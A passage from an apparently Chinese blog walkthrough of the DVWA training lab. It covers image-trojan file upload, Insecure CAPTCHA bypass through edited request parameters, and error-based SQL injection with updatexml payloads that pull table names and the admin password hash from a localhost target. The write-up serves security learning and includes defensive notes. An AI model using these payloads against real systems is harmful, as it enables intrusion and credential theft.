src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440736.png alt=image-20221125165605200></figure></p><p>尝试访问</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440235.png alt=image-20221125165645333></figure></p><p>未报错，攻击成功</p><div id=high-4 class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-4 aria-label=锚点>#</a></span></h3><p>源码分析</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>( ( <span style=color:#a6e22e>strtolower</span>( $uploaded_ext ) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;jpg&#34;</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>strtolower</span>( $uploaded_ext ) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;jpeg&#34;</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>strtolower</span>( $uploaded_ext ) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;png&#34;</span> ) <span style=color:#f92672>&amp;&amp;</span>
</span></span><span style=display:flex><span>        ( $uploaded_size <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100000</span> ) <span style=color:#f92672>&amp;&amp;</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>getimagesize</span>( $uploaded_tmp ) ) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>以上代码审查了文件后缀、文件大小、图片是否是真的，因此需要上传真正的、可以打开的图片文件，因此需要上传图片木马。</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>如何在图片中写入恶意代码？</span>
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>可以在图片中的注释信息添加php代码，这样php的include函数解析二进制文件时发现这是php代码，就会执行它。</span>
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>借助小工具edjpgcom可以嵌入恶意代码</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>这样木马图片就可以被成功上传，但是想要执行，还是需要文件包含漏洞</span>
</span></span></code></pre></div><div id=impossible-4 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-4 aria-label=锚点>#</a></span></h3><p>源码分析</p><ol><li><p>加入user_token</p></li><li><p>生成md5作为新的文件名，并且成功上传的时候不会显示路径，只有名字</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440263.png alt=image-20221125171639174></figure></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    $target_file   <span style=color:#f92672>=</span>  <span style=color:#a6e22e>md5</span>( <span style=color:#a6e22e>uniqid</span>() <span style=color:#f92672>.</span> $uploaded_name ) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>.</span> $uploaded_ext;
</span></span></code></pre></div></li><li><p>限制文件后缀、大小，以及检查是否能打开</p></li><li><p>满足以上要求的图片会被重写，注释全被删除，只留下图片本身的信息，以及销毁源图片。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>( $uploaded_type <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;image/jpeg&#39;</span> ) {
</span></span><span style=display:flex><span>            $img <span style=color:#f92672>=</span> <span style=color:#a6e22e>imagecreatefromjpeg</span>( $uploaded_tmp );
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>imagejpeg</span>( $img, $temp_file, <span style=color:#ae81ff>100</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            $img <span style=color:#f92672>=</span> <span style=color:#a6e22e>imagecreatefrompng</span>( $uploaded_tmp );
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>imagepng</span>( $img, $temp_file, <span style=color:#ae81ff>9</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>imagedestroy</span>( $img );
</span></span></code></pre></div></li></ol><div id=总结与防御-4 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1-4 aria-label=锚点>#</a></span></h3><p>​ 在向网页上传文件时，如果服务器端代码未对客户端上传的文件进行严格的验证和过滤，就容易被上传上来的脚本文件等木马攻击。这类脚本称之为 WebShell，用户可以利用这种恶意脚本查看服务器目录、修改服务器文件和执行系统命令等。
为了防御这种攻击，可以使用白名单判断文件类型和后缀是否合法，同时对上传后的文件进行重命名防止被攻击者利用。</p><div id=nsecure-captcha-不安全的验证码 class=anchor>nsecure CAPTCHA （不安全的验证码）></div><h2 class="relative group">nsecure CAPTCHA （不安全的验证码）
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#nsecure-captcha-%e4%b8%8d%e5%ae%89%e5%85%a8%e7%9a%84%e9%aa%8c%e8%af%81%e7%a0%81 aria-label=锚点>#</a></span></h2><p>配置文件</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>vim</span> <span style=color:#f92672>/</span><span style=color:#66d9ef>var</span><span style=color:#f92672>/</span><span style=color:#a6e22e>www</span><span style=color:#f92672>/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>/</span><span style=color:#a6e22e>config</span><span style=color:#f92672>/</span><span style=color:#a6e22e>config</span><span style=color:#f92672>.</span><span style=color:#a6e22e>inc</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> $_DVWA[ <span style=color:#e6db74>&#39;recaptcha_public_key&#39;</span> ]  <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#39;</span>;
</span></span><span style=display:flex><span>$_DVWA[ <span style=color:#e6db74>&#39;recaptcha_private_key&#39;</span> ] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>docker</span> <span style=color:#a6e22e>cp</span> <span style=color:#a6e22e>D</span><span style=color:#f92672>:</span><span style=color:#a6e22e>\config</span><span style=color:#f92672>.</span><span style=color:#a6e22e>inc</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>d45</span><span style=color:#f92672>:/</span><span style=color:#66d9ef>var</span><span style=color:#f92672>/</span><span style=color:#a6e22e>www</span><span style=color:#f92672>/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>/</span><span style=color:#a6e22e>config</span><span style=color:#f92672>/</span><span style=color:#a6e22e>config</span><span style=color:#f92672>.</span><span style=color:#a6e22e>inc</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440242.png alt=image-20221130163323944></figure></p><div id=low-5 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-5 aria-label=锚点>#</a></span></h3><p>发起请求，抓包查看请求参数</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>step=1&amp;password_new=1&amp;password_conf=1&amp;Change=Change
</span></span></span></code></pre></div><p>可以看到除了密码外，还有step和Change两个参数，可以推断这两个参数就是验证方法</p><p>而这两个参数都是可以通过抓包重放修改的，这里就将1改为2</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440350.png alt=image-20221130173549203></figure></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071440542.png alt=image-20221130174253006></figure></p><p>攻击成功</p><p>源码分析，主要以两个if判断分为两个部分只要step为2，就可以修改成功</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>isset</span>( $_POST[ <span style=color:#e6db74>&#39;Change&#39;</span> ] ) <span style=color:#f92672>&amp;&amp;</span> ( $_POST[ <span style=color:#e6db74>&#39;step&#39;</span> ] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;1&#39;</span> ) ) <span style=color:#75715e>// 修改失败
</span></span></span><span style=display:flex><span><span style=color:#75715e>//The CAPTCHA was incorrect. Please try again.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>isset</span>( $_POST[ <span style=color:#e6db74>&#39;Change&#39;</span> ] ) <span style=color:#f92672>&amp;&amp;</span> ( $_POST[ <span style=color:#e6db74>&#39;step&#39;</span> ] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;2&#39;</span> ) ) <span style=color:#75715e>// 修改成功
</span></span></span><span style=display:flex><span><span style=color:#75715e>//echo &#34;&lt;pre&gt;Password Changed.&lt;/pre&gt;&#34;;
</span></span></span></code></pre></div><div id=medium-5 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-5 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>step=1&amp;password_new=1&amp;password_conf=1&amp;g-recaptcha-response=&amp;Change=Change
</span></span></span></code></pre></div><p>新增参数recaptcha-response</p><p><strong>源码分析</strong></p><p>发现多了对<code>passed_captcha</code>的判断，这同样是可以通过抓包重放修改的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>( <span style=color:#f92672>!</span>$_POST[ <span style=color:#e6db74>&#39;passed_captcha&#39;</span> ] ) {
</span></span><span style=display:flex><span>        $html     <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#34;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&#34;</span>;
</span></span><span style=display:flex><span>        $hide_form <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>发起攻击</p><p>将参数改为</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>step=2<span style=color:#960050;background-color:#1e0010>&amp;</span>password_new=1<span style=color:#960050;background-color:#1e0010>&amp;</span>password_conf=1<span style=color:#960050;background-color:#1e0010>&amp;</span>Change=Change<span style=color:#960050;background-color:#1e0010>&amp;</span>passed_captcha=true
</span></span></code></pre></div><div id=high-5 class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-5 aria-label=锚点>#</a></span></h3><p>抓包找参数</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>step=1<span style=color:#960050;background-color:#1e0010>&amp;</span>password_new=1<span style=color:#960050;background-color:#1e0010>&amp;</span>password_conf=1<span style=color:#960050;background-color:#1e0010>&amp;</span>g-recaptcha-response=<span style=color:#960050;background-color:#1e0010>&amp;</span>user_token=b40afe8549509540f680f64bbed5d3cf<span style=color:#960050;background-color:#1e0010>&amp;</span>Change=Change
</span></span></code></pre></div><p><strong>源码分析</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span> (
</span></span><span style=display:flex><span>        $resp <span style=color:#f92672>||</span> (
</span></span><span style=display:flex><span>            $_POST[ <span style=color:#e6db74>&#39;g-recaptcha-response&#39;</span> ] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;hidd3n_valu3&#39;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&amp;&amp;</span> $_SERVER[ <span style=color:#e6db74>&#39;HTTP_USER_AGENT&#39;</span> ] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;reCAPTCHA&#39;</span>
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>    )
</span></span></code></pre></div><p>同样是抓包修改参数<code>HTTP_USER_AGENT</code>和<code>g-recaptcha-response</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>User-Agent: reCAPTCHA
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>step=1&amp;password_new=1&amp;password_conf=1&amp;g-recaptcha-response=hidd3n_valu3&amp;user_token=73c5e811ef332d2556e6a7b87151ff2c&amp;Change=Change
</span></span></span></code></pre></div><p>攻击成功</p><div id=impossible-5 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-5 aria-label=锚点>#</a></span></h3><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441929.png alt=image-20221130200707448></figure></p><p>同样的，我都知道当前密码了，还破解什么</p><div id=sql-injectionsql注入 class=anchor>SQL Injection（SQL注入）></div><h2 class="relative group">SQL Injection（SQL注入）
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#sql-injectionsql%e6%b3%a8%e5%85%a5 aria-label=锚点>#</a></span></h2><blockquote><p>联合查询注入、报错注入、时间盲注、布尔盲注</p></blockquote><div id=low-6 class=anchor>low></div><h3 class="relative group">low
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#low-6 aria-label=锚点>#</a></span></h3><blockquote><p>报错注入</p></blockquote><ol><li><p>先确定有没有报错信息</p><p>输入'1&rsquo;，可以看到错误信息</p><p>![image-20221130234655912](D:\OneDrive - mail.ynu.edu.cn\note\typoranote\DVWA.assets\image-20221130234655912.png)</p><p>因此可以使用报错注入</p></li><li><p>使用函数<code>updatexml()</code>和<code>concat()</code>构造sql语句</p><blockquote><p>updatexml()可以将报错信息返回</p><p>concat()本身是一个字符串拼接函数，同时可以执行SQL语句</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- 发起请求的模式 只需要修改&#39;abc&#39;即可
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>http:<span style=color:#f92672>//</span><span style=color:#ae81ff>127</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>vulnerabilities<span style=color:#f92672>/</span>sqli<span style=color:#f92672>/?</span>id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39; and updatexml(1,concat(&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;,(&#39;</span>abc<span style=color:#e6db74>&#39;),&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;),1) -- &amp;Submit=Submit
</span></span></span></code></pre></div><p>报错信息形如</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441386.png alt=image-20221130235918932></figure></p></li><li><p>获取当前以及其他所有数据库</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- 当前
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>http:<span style=color:#f92672>//</span><span style=color:#ae81ff>127</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>vulnerabilities<span style=color:#f92672>/</span>sqli<span style=color:#f92672>/?</span>id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39; and updatexml(1,concat(&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;,(
</span></span></span><span style=display:flex><span><span style=color:#e6db74>database()
</span></span></span><span style=display:flex><span><span style=color:#e6db74>),&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;),1) -- &amp;Submit=Submit
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-- 返回信息：XPATH syntax error: &#39;</span><span style=color:#f92672>!</span>dvwa<span style=color:#f92672>!</span><span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-- 其他
</span></span></span><span style=display:flex><span><span style=color:#e6db74>http://127.0.0.1/vulnerabilities/sqli/?id=&#39;</span> <span style=color:#66d9ef>and</span> updatexml(<span style=color:#ae81ff>1</span>,concat(<span style=color:#e6db74>&#39;!&#39;</span>,(
</span></span><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#66d9ef>schema_name</span> <span style=color:#66d9ef>from</span> information_schema.schemata <span style=color:#66d9ef>limit</span> <span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>),<span style=color:#e6db74>&#39;!&#39;</span>),<span style=color:#ae81ff>1</span>) <span style=color:#75715e>-- &amp;Submit=Submit
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>-- limit 0,1 返回信息：XPATH syntax error: &#39;!dvwa!&#39;
</span></span></span><span style=display:flex><span><span style=color:#75715e>-- limit 1,1 返回信息：XPATH syntax error: &#39;!information_schema!&#39;
</span></span></span></code></pre></div></li><li><p>获取指定数据库中的表</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>http:<span style=color:#f92672>//</span><span style=color:#ae81ff>127</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>vulnerabilities<span style=color:#f92672>/</span>sqli<span style=color:#f92672>/?</span>id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39; and updatexml(1,concat(&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;,(
</span></span></span><span style=display:flex><span><span style=color:#e6db74>select table_name from information_schema.tables where table_schema=&#39;</span>dvwa<span style=color:#e6db74>&#39; limit 1,1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>),&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;),1) -- &amp;Submit=Submit
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-- XPATH syntax error: &#39;</span><span style=color:#f92672>!</span>guestbook<span style=color:#f92672>!</span><span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-- XPATH syntax error: &#39;</span><span style=color:#f92672>!</span>users<span style=color:#f92672>!</span><span style=color:#e6db74>&#39;
</span></span></span></code></pre></div></li><li><p>获取指定库中指定表的字段</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>http:<span style=color:#f92672>//</span><span style=color:#ae81ff>127</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>vulnerabilities<span style=color:#f92672>/</span>sqli<span style=color:#f92672>/?</span>id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39; and updatexml(1,concat(&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;,(
</span></span></span><span style=display:flex><span><span style=color:#e6db74>select column_name from information_schema.columns where table_schema=&#39;</span>dvwa<span style=color:#e6db74>&#39; and table_name=&#39;</span>users<span style=color:#e6db74>&#39; limit 3,1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>),&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;),1) -- &amp;Submit=Submit
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>--limit 3,1 &gt; XPATH syntax error: &#39;</span><span style=color:#f92672>!</span><span style=color:#66d9ef>user</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>--limit 4,1 &gt; XPATH syntax error: &#39;</span><span style=color:#f92672>!</span>password<span style=color:#f92672>!</span><span style=color:#e6db74>&#39;
</span></span></span></code></pre></div></li><li><p>获取指定库中指定表指定字段的值</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>http:<span style=color:#f92672>//</span><span style=color:#ae81ff>127</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>vulnerabilities<span style=color:#f92672>/</span>sqli<span style=color:#f92672>/?</span>id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39; and updatexml(1,concat(&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;,(
</span></span></span><span style=display:flex><span><span style=color:#e6db74>select user from dvwa.users limit 0,1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>),&#39;</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;),1) -- &amp;Submit=Submit
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-- XPATH syntax error: &#39;</span><span style=color:#f92672>!</span><span style=color:#66d9ef>admin</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>http://127.0.0.1/vulnerabilities/sqli/?id=&#39;</span> <span style=color:#66d9ef>and</span> updatexml(<span style=color:#ae81ff>1</span>,concat(<span style=color:#e6db74>&#39;&#39;</span>,(
</span></span><span style=display:flex><span><span style=color:#66d9ef>select</span> password <span style=color:#66d9ef>from</span> dvwa.users <span style=color:#66d9ef>limit</span> <span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>),<span style=color:#e6db74>&#39;&#39;</span>),<span style=color:#ae81ff>1</span>) <span style=color:#75715e>-- &amp;Submit=Submit
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>-- XPATH syntax error: &#39;f4dcc3b5aa765d61d8327deb882cf99&#39;
</span></span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441566.png alt=image-20221201122627366></figure></p><p>至此，攻击成功</p></li></ol><div id=medium-6 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-6 aria-label=锚点>#</a></span></h3><p>中级难度改成了下拉选择框，这属于前端校验，还需要看看后端校验</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441365.png alt=image-20221201142622701></figure></p><p><strong>源码分析</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_real_escape_string</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>], $id);
</span></span></code></pre></div><p>可以发现多了该行代码，作用是对SQL语句中的单引号和双引号进行转义，转义后就变为了普通的字符，不具备本来的功能了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$query  <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT first_name, last_name FROM users WHERE user_id = </span><span style=color:#e6db74>$id</span><span style=color:#e6db74>;&#34;</span>;
</span></span></code></pre></div><p>还可以发现<code>id</code>变为了数字型</p><p><strong>解决办法：</strong> 使用十六进制，将所有引号删除，并将其中的句子转为十六进制</p><p><strong>发起攻击</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- 原语句
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39; and updatexml(1,concat(&#39;&#39;,(select password from dvwa.users limit 0,1),&#39;&#39;),1) -- &amp;Submit=Submit
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-- 修改后
</span></span></span><span style=display:flex><span><span style=color:#e6db74>id=2 and updatexml(1,concat((select password from dvwa.users limit 0,1)),1)&amp;Submit=Submit
</span></span></span></code></pre></div><p><strong>攻击成功</strong></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071441635.png alt=image-20221201150937667></figure></p><div id=high-6 class=anchor>high></div><h3 class="relative group">high
